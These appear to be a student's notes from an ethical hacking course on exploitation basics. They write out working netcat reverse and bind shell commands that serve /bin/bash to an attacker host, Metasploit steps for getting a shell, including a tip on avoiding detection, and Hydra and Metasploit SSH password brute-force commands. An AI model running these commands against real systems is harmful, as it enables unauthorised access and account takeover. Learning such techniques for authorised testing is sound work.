## exploitation basics

Date:  Oct 2, 2022
Course:  TCM Practical Ethical Hacker
Topics: [[peh]]  

---
### Reverse Shell vs Bind Shell

- **Reverse shell** - 
	- Attacker opens listening port. Target (victim) connects back to open port on attacker.
	- Attackbox (open port) <- Targetbox

```shell
AttackBox$ nc -nvlp 4444
```
```shell
TargetBox$ nc 192.168.0.10 4444 -e /bin/bash
```


- **Bind shell** -
	- Attacker gains access to target (victim) through exploit or other means and opens port on Target (victim). Allowing attacker to connect to open port on victim.
	- Attackbox -> Targetbox (open port)

```shell
TargetBox$ nc -nvlp 4444 -e /bin/bash
```
```shell
AttackBox$ nc 192.168.0.10 4444
```

### Staged vs Non-staged Payloads

- Non-staged
	- Sent all at once
	- Larger in size
	- Doesn't always work
	- `meterpreter_reverse_tcp`

- Staged
	- Sends payloads in stages
	- Can be less stable
	- `meterpreter/reverse_tcp` # note forward slash

- Gaining Root with Metasploit
```
msfconsole
search exploit_name
use 1 #number or full path of exploit
options #set options
set RHOSTS 192.168.0.10 # target IP
exploit #run exploit
```

- Consider changing LPORT from 4444 to reduced chance of detection
- `set payload linux` use tab autocomplete
- `set payload linux/x86/shell_reverse_tcp`
- `[*] Command shell session 12 opened` indication of successful shell
- Test with commands such as `whoami`

### Brute Force Attacks

- Kali using hydra
	- `hydra -l root -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.0.10:22 -t 4 -V`

- Using metasploit
```shell
msfconsole
msf6 > use auxiliary/scanner/ssh/ssh_log
msf6 auxiliary(scanner/ssh/ssh_login) > options
msf6 auxiliary(scanner/ssh/ssh_login) > set username root
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOST 192.168.0.10
msf6 auxiliary(scanner/ssh/ssh_login) > set threads 10
msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

### Credential Stuffing and Password Stuffing
- What is credential stuffing?
	- Injecting breached account credentials in hopes of account takeover


